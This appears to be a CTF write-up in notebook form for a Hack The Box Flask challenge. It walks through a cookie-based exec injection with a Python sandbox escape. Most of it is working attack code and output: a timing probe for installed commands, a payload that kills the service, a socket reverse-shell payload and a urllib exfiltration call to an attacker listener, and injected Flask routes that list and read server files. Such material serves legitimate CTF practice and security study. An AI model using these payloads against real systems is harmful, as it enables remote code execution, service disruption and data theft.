    <!DOCTYPE html>\n<html><head>\n<meta content="width=device-width, initial-scale=1" name="viewport"/>\n<meta content="makelaris" name="author"/>\n<title>\U0001f30c on Venzenulon 9</title>\n<link crossorigin="anonymous" href="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet"/>\n<link href="//fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css"/>\n<style>html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>\n</head>\n<body>\n<img class="mx-auto d-block img-responsive" src="//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif"/>\n</body>\n<!-- /debug -->\n</html>



The HTB app sleeps. This means that on the hosting machine `pip` is indeed likely to be installed.

We can abtract this logic in a procedure to test if a package/command (with a helper invoked by `-h`) is installed.


```python
import time
def test_command(target_url,cmd):
    pl_basic = """import os,time\nif os.system('{} -h')==0: time.sleep(10)""".format(cmd)
    pl_for_cookie = make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_basic))
    cookie = from_payload_to_cookie_for_flask(pl_for_cookie,secret_key)
    s = time.time()
    print("Testing if {} is available.....".format(cmd))
    res = get_response_from_the_app_using_cookie(target_url,cookie)
    e = time.time()
    if (e-s)>=10:
        print("{} is probably AVAILABLE".format(cmd))
    else:
        print("{} is NOT AVAILABLE".format(cmd))


```


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820


We use the procedure just wrote to test again for `pip` and for others.


```python
test_command(url, "pip")
```

    Testing if pip is available.....
    pip is probably AVAILABLE



```python
test_command(url, "pip3")
```

    Testing if pip3 is available.....
    pip3 is NOT AVAILABLE


We would like to know if any package that could turn out very useful for the attack is installed. For instance it could come very handy knowing that netcat or telnet are installed.


```python
test_command(url, "nc")
```

    Testing if nc is available.....
    nc is NOT AVAILABLE



```python
test_command(url, "telnet")
```

    Testing if telnet is available.....
    telnet is NOT AVAILABLE



```python
test_command(url, "curl")
```

    Testing if curl is available.....
    curl is NOT AVAILABLE


We are able to get very useful information with the procedure just wrote.

For instance we could search for a certain package manager like apt or yum. But all the tests turn out unsuccessful.

## Bind shell

The next objective is to run a shell service on a given port of the target host and connect to it from our attacking machine. What is known as a **bind shell**.

But the HTB app is running in a dockerized container. We do not know how (and if) the ports of the container are mapped with the host. The only port that we know for sure (from source code) to be mapped is the `1337` of the container. This port is running the Flask service and is mapped to the one that HTB gives us to connect to.


The presence of containerization does not make bind shells so appealing.

Even if we are able to open new ports in the container it could happen that such ports are not mapped to any of the host running the container.

The best thing we can try in this case is to override the service running on port `1337`. We at least know that such a port can be reached from the outside.

The override can happen with the following logical steps:

    i) kill the services running on port `1337`

    ii) create a new service running on the same port

We have to issue commands to the operating system that allows us to perform such operations. The problem is that the only way we can interface with the OS is through the service running on the same port we want to kill.


To make a quick test we launch a command that kills the service on `1337` and upon success runs a simple python http server on the same port.

The bash command we want to execute is ```kill -9 $(lsof -t -i:1337) && python -m SimpleHTTPServer 1337```

At first we test that `lsof` is actually present on the target machine.


```python
test_command(url,'lsof')
```

    Testing if lsof is available.....
    lsof is probably AVAILABLE


We test if we can kill the app that is running on the HTB address.


```python
pl_kill_htb = """import os;os.system('kill -9 $(lsof -t -i:1337)')"""
```

Applying all the procedures at our disposal, we make the HTB app executing such a command.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820



```python
try:
    get_response_from_the_app_using_cookie(url,from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_kill_htb)),secret_key,debug_recipe=True))
except:
    print("Probably the app was succesfully killed!\nCheck it at %s"%url)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjd8KwiAUxl/lIIEKKcUuovUoY4iawiGdsaNQRO+e21V3H7/vX3gFLxhjmJ9lrVDoVkjTm2rIgj8wJVBXOIhEJYKqoHA8D8NFctk7xw83xjVMFRcyho+Th1hW8IALCKmN8clSd7pylsIuqLmdhs6FBIzAva18q/huLzb3HMzTad4Wcrm3FPT/zVf+AFbHOvo="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 274
    Probably the app was succesfully killed!
    Check it at http://167.172.53.64:30820


The app has been **succesfully killed** though the service gets restarted quickly.

Notwithstanding we know that we are able to kill it. We now try to kill it and later run a new service on that port.


```python
pl_kill_htb_and_run_new = """import os;os.system('kill -9 $(lsof -t -i:1337) && python -m SimpleHTTPServer 1337')"""
```


```python
try:
    get_response_from_the_app_using_cookie(url,from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_kill_htb)),secret_key,debug_recipe=True))
except:
    print("Check if the Python http service is running at %s"%url)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjd8KwiAUxl/lIIEKKcUuovUoY4iawiGdsaNQRO+e21V3H7/vX3gFLxhjmJ9lrVDoVkjTm2rIgj8wJVBXOIhEJYKqoHA8D8NFctk7xw83xjVMFRcyho+Th1hW8IALCKmN8clSd7pylsIuqLmdhs6FBIzAva18q/huLzb3HMzTad4Wcrm3FPT/zVf+AFbHOvo="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 274
    Check if the Python http service is running at http://167.172.53.64:30820


**NO!** As we could have expected the Python server is not running on the port.

The problem is that the second command's (`python -m ...`) execution is still dependent on the app. Upon the killing we are not able to execute it.

This suggests us to leave the attempt of executing a bind shell on the target machine.

## Reverse shell

An other tactic is to use a **reverse shell**. We make our attacking machine listening on a port and force the victim to connect to it. Upon connection the victim launches an instance of its shell (`/bin/bash`) and share it on our listening port.



We test this approach on our local app that is running in a container with address `173.17.0.3`. We have hardcoded this address inside the docker-compose configuration file.

We start a listening service on port `1234` on our localhost using netcat: `nc -lp 1234`.

We want to connect to such a port from the container and send the shell.

Netcat (or telnet) is not installed on the HTB machine and we are not able to find any package manager that can be used to install such programs. This is why to target also our local app we use the Python `socket` library.

The following statement, that we want our local app to execute, sends a shell of the victim to our listening machine.

In the network we created for this environment our hosting machine has an address of `173.17.0.1`, as shown by the following interface information:

<img src="https://i.ibb.co/VYNH4gM/ifconfig.png" alt="ifconfig" border="0">


```python
pl_send_bash = """import socket as k,os as o;pty as t;s=k.socket(2,1);s.connect(("173.17.0.1",3333));o.dup2(s.fileno(),0); o.dup2(s.fileno(),1);t.spawn("/bin/ls")"""
```


```python
len(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_send_bash)))
```

The problem with such a statement is its length. Too long for reaching the `exec` we desire. Before trying to find a way (if possible at all) to reduce the length we have to check that we are heading in the right way.

Using the socket library we send from the app a message to our listening service. If we recieve it then reducing the length of the previous payload would make sense. But if such a message is not recieved then it is an indication that is better to explore other ways for the attack.

We want to force the app to send a `Hi!` to our listening port on the attacking machine.


```python
pl_send_msg = """import socket;s=socket.socket(2,1);s.connect(("172.17.0.1",1234));s.send("Hi!")"""
```


```python
cookie = from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_send_msg)),secret_key,debug_recipe=True)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjdEKgzAMRX8l60tbkGLdYDDZ+/5BpGiMUKbtMBUGY/++qi97yuGe5IbehEoI4edXXBJwxCelmu8HmGOoqrC6ZoMxBMKklLDXytirKY0Vha3OF71ppjAo8fAnoXNj8ZHO9aufkg/snLw1CGNcAMEHUNo4h1PH2WTqO6YdeO33lHKuNPgRJHZJbieYdejmvAdtU7ZbwxyHdSLz/+arfz23Q58="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 298



```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server2
    Using the url: http://173.17.0.3:1337



```python
get_response_from_the_app_using_cookie(url,cookie)
```




    <html><body><p>render_template('index.html')</p></body></html>



We see that we are able to recieve on our localhost the message sent by the container.


<img src="https://i.ibb.co/zPsjHcY/nc-hi-local-local.png" alt="nc-hi-local-local" border="0">

We use an AWS machine with a public IP address to run the listening service.

We are able to recieve the message from our local app but not from the one running on the HTB host.

**Conclusion**: it is better to leave this approach and find other ways. We are indeed not able to connect from the HTB machine to our public ip address. This makes redundant to work on the length reduction of the payload to get the bash shell.



Very likely a Firewall is getting on our way.

This poses an other question.

We can't use the socket library, but is there a way we can execute `GET` requests from the target machine?

## Data exfiltration using GET methods

The strategy here is to open a port of our public facing machine (using netcat for instance). We then launch a `GET` request from the target app using the `urllib` Python library. As the endpoint for the URL we use information we could be interested into, like the result of `os.listdir(.)`.

For instance assume that `[a.py,b.py]` is the result of the directory listing. The `GET` request to be sent is then `GET /[a.py,b.py]`. Although such a route does not exist we can anyway see the information from the log of our listening service.

To build this strategy we use the app running in our container at first.

We launch netcat on our local machine: `nc -lp 1234`.

It is not necessary right now to send the payload that would return the information we are interested into. We have to check that such a strategy could actually work.

This is why we send a fake message at first. We send something like `FILES_LIST`. If we recieve it from the HTB machine to our public netcat instance then building more complex payloads make sense. We could for instance use the `os` module to get more info.

On the other hand, if our public facing machine does not recieve the GET request from HTB then we will know also this strategy is to be abandoned.


```python
pl_info_in_fake_route = """import urllib as u;u.urlopen('http://173.17.0.1:1234/FILES_LIST')"""
```

We test it first on our local network interface.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server2
    Using the url: http://173.17.0.3:1337



```python
res = get_response_from_the_app_using_cookie(url,
                                             from_payload_to_cookie_for_flask(
                                                 make_the_payload_using_base64_and_zlib(
                                                     make_a_statement_for_exec_consistent_with_sandbox(
                                                         pl_info_in_fake_route)),
                                                 secret_key,debug_recipe=True))
```

The following image shows that we were able to do this on our local network interface.

<img src="https://i.ibb.co/mXKXtWV/nc-fileslist-local.png" alt="nc-fileslist-local" border="0">

We are as well able to send this information from our containerized app to our public facing machine on AWS.

Nothwithstanding we **fail** when we try to send it from the HTB machine to our public IP.

Also this strategy does not work!

## Flask

Now that we have tried many strategies we pause and ponder.

The information we are looking for has to come back from Flask.

How?

A good strategy could be making the information pass through metadata, like chaning the user-agent or the server string used by Flask in the responses.

We are not able to find a way to change such information gloabally. We are also executing our code into a restricted environment, where global variables have been limited.

Such limitation does not allow us to refer to the gloabal variable `app` that has been defined outside of the exec context.

**But** the `flask` module has a very interesting attribute, namely `current_app`.



We start exploring this attribute. Could we use it to create new routes for the app also from the restricted environment we are forced to work in?


```python
pl_new_route_with_listing = """import flask,os;flask.current_app.add_url_rule('/l','l',lambda:str(os.listdir('.')))"""
```


```python
cookie = from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_new_route_with_listing)),secret_key,debug_recipe=True)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjksKwzAMRK9ispENwe06PUooQv4ETO04yDYUSu9eJasuBI8ZaUbxHb2epimVo3JXW6b2mmt7XGD9YI57RzoOSyHg4Iw8ctRwyzCDTKbiAi2ts67N5tR6SKzBgjFGYucPILqRck97Q4Rl9WqrrLxKu9LGInopEkfIUYsXtOEuNYqujUqbAk8dzhMv9k5F9tRzvT/PhFKDfGT/a77mBxBLSVQ="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 298


Following our strategy, we test this payload first on our local app and then, if successfull, on HTB.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server2
    Using the url: http://173.17.0.3:1337



```python
res = get_response_from_the_app_using_cookie(url, cookie)
```

We connect to the route just created (`/l`) and check if we get the desired response.


```python
print requests.session().get(url+"/l").text
```

    ['webserver.py']


This attack is **successfull** on our local app. We are going to test against the one from HTB.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820



```python
res = get_response_from_the_app_using_cookie(url, cookie)
```


```python
print requests.session().get(url+"/l").text
```

    ['app.py', 'templates', 'totally_not_a_loooooooong_flaaaaag']


**YES!** This approach is successfull also against HTB.

We see that there is a `totally_not_a_loooooooong_flaaaaag` object in the current directory. We are not able to determine with this output if it is a file or a directory.

Better to use `os.walk` and print the entire tree.


```python
pl_new_route_with_walk = """import flask,os;flask.current_app.add_url_rule('/e','e',lambda:str(list(os.walk('.'))))"""
```


```python
cookie = from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_new_route_with_walk)),secret_key,debug_recipe=True)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNTkkKwzAM/IrJRTYEt+f0KaEIeQmYeAleaKH071VyqkAwzEgz49/eymmaQjpK7WKL1Pa5tMcFtB21+tyRjkOTczhqxDqil3DzMANvpGQcLa1XGUPrsjT9orhL0KB42Hn+AKIZIfaQGyIsqxVbqcKKkIVUGtFyFiuMDDV/gTbMxXrmpRJhE2Cpw/liWc6U+E481/vzdEjFcSn9H/NVP8aTSgc="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 298


We test it directly on HTB.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820



```python
res = get_response_from_the_app_using_cookie(url, cookie)
```


```python
print requests.session().get(url+"/e").text
```

    [('.', ['templates'], ['app.py', 'totally_not_a_loooooooong_flaaaaag']), ('./templates', [], ['index.html'])]


From the previous output we can see that the `totally_not_a_loooooooong_flaaaaag` is a file.

We can get it with the following payload.


```python
pl_read_ctf_file = """import flask,os;flask.current_app.add_url_rule('/w','w',open(os.listdir('.')[-1]).read"""
```


```python
ctf_cookie = from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_read_ctf_file)),secret_key,debug_recipe=True)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjt0KwjAMhV8l7CYtzKq3+ihjhK7NoNi1oz8oiO9u3JUXgY9zknPCL3ZqGIaw7bk0WKOtjzHX+wHG9VI4NbL7bqz31Euk0iMrPD9xRJm8c1K5mhhq86EoNKin03XWprD1Ejy+kWjpIbaQKhHeJgdrLuAgJFDaEDmpEkdosZUPqH05VBZdaQgroLMNfydO7GQ32YN5usy/hC17+cn813z0F41HSd8="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 302


Unfortunately the procedure we have implemented results into a payload that is too long! It was indeed not optimized for length rather for readability.

We try to reduce the length manually!



```python
pl_read_file_full_payload = """exec("import flask,os;flask.current_app.add_url_rule('/w','w',open(os.listdir('.')[-1]).read)",{'__builtins__':[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__][0]()._module.__builtins__})"""
```


```python
print pl_read_file_full_payload
```

    exec("import flask,os;flask.current_app.add_url_rule('/w','w',open(os.listdir('.')[-1]).read)",{'__builtins__':[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__][0]()._module.__builtins__})



```python
pl_with_encoding_for_ingredient = """d='%cdecode'%46+'%c'%40;exec "a=%s"%'"{}"'+d+'"base64")'+d+'"zlib")';exec a#""".format(pl_read_file_full_payload.encode('zlib').encode('base64').replace('\n',''))
```


```python
print pl_with_encoding_for_ingredient
```

    d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjtEKwjAMRX+l+JIWZtVX/ZQxQtdmUOzakbYoiP9uticfAod7k9xLb/L6FNetcFNLcvU5lPo4wPrOTLmh2zbrQsDOCbkn0nB5wQAyZaOsS7Up1hYia7BgxvNtMpbJBXMaPoA495hazBUR7qNXS2HlVcxKG4voJUkcodlVOqD2+VBJdG1UXBR412A/8WJnt8reNF6n/cFagjSy/ylf8wPhtklg"'+d+'"base64")'+d+'"zlib")';exec a#



```python
cookie_clear = {u'ingredient': pl_with_encoding_for_ingredient, u'measurements': ' '}
recipe = '%s = %s' % (cookie_clear['ingredient'], cookie_clear['measurements'])
print( "Recipe " + recipe + "\nLEN: " + str(len(recipe)))
```

    Recipe d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjtEKwjAMRX+l+JIWZtVX/ZQxQtdmUOzakbYoiP9uticfAod7k9xLb/L6FNetcFNLcvU5lPo4wPrOTLmh2zbrQsDOCbkn0nB5wQAyZaOsS7Up1hYia7BgxvNtMpbJBXMaPoA495hazBUR7qNXS2HlVcxKG4voJUkcodlVOqD2+VBJdG1UXBR412A/8WJnt8reNF6n/cFagjSy/ylf8wPhtklg"'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN: 298


We have been able to reduce the length of the `recipe` string.


```python
print cookie_clear
```

    {u'measurements': ' ', u'ingredient': 'd=\'%cdecode\'%46+\'%c\'%40;exec "a=%s"%\'"eJxNjtEKwjAMRX+l+JIWZtVX/ZQxQtdmUOzakbYoiP9uticfAod7k9xLb/L6FNetcFNLcvU5lPo4wPrOTLmh2zbrQsDOCbkn0nB5wQAyZaOsS7Up1hYia7BgxvNtMpbJBXMaPoA495hazBUR7qNXS2HlVcxKG4voJUkcodlVOqD2+VBJdG1UXBR412A/8WJnt8reNF6n/cFagjSy/ylf8wPhtklg"\'+d+\'"base64")\'+d+\'"zlib")\';exec a#'}


We have reduced the length. We build the flask cookie from such a payload.


```python
ctf_cookie = from_payload_to_cookie_for_flask(pl_with_encoding_for_ingredient,secret_key)
```


```python
print ctf_cookie
```

    .eJw9kctuozAARX9lxHoWxgRNW6mLQIDYaZwCtsHe8bDCw6YMMGlJlX8vq1lc6d6zvOfbaofrpOpWDYv18m39Kq0XSx7AgDPSy4zcZMQGTGN4WisttpDD_o_Mm63vW0GBrlak8Yp1OjSXYkjC1Kn_xsxOM3-ZT2DE3B4B19dbpsMdy5O-5PxdmXASWt8KvnfrPBkFlF4JY6e46x2N0I0eZEQNBwLIC40I5JTPLHoCte2t1E7OZXZdlcEry0lAAWkLuPsse2TXdugpPjbUIZTY_POcNbLIAic29a7uXUBzr017LGgWxiUIwIXyD5GPPufIqZgr2B2jMpSdCpYjOcpbqvkk4HO_sfeKxevJln5qkuOZcxFrBM4Ue2_3Jk-NCy5HrGkvYNk-d4kJh0IT983Rs-wah0UNKODXgNpqkv48IIObCjJIfDTidem3b1tlvkbRbvu-aBXxDkVBZz1-W0YV879Jmc3P_F8Q2r--Wo_HD6jwlO8.X4R-Ww.3mnjFYZY8PlxslO4VQLgtzZmr1I



```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820



```python
res = get_response_from_the_app_using_cookie(url, ctf_cookie)
```


```python
flag = requests.session().get(url+"/w").text
```


```python
print "And the flag is......\n%s"%flag
```

    And the flag is......
    HTB{d1d_y0u_h4v3_FuN_c4lcul4t1nG_Th3_d4rK_m4tt3r?!}
